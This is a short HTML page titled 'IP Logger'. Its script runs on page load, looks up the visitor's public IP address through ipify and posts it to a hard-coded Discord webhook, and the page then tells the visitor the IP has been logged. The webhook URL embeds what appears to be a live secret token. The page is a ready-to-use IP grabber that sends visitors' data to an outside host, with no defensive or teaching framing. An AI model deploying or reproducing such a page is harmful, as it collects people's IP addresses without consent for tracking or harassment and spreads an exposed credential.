<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
</head>
<body>
    <h1>Your IP address has been logged</h1>
    <script>
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const webhookUrl = 'https://discord.com/api/webhooks/1256722907120533585/tAJ8scYaxDkE_iNrwQlWQDZbcNUbF6nelDyV3iobumge0Vtb7roVV2avQk9vpNio22R2';

                const payload = JSON.stringify({
                    content: `New IP logged: ${ip}`
                });

                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: payload
                });
            })
            .catch(error => console.error('Error fetching IP:', error));
    </script>
</body>
</html>
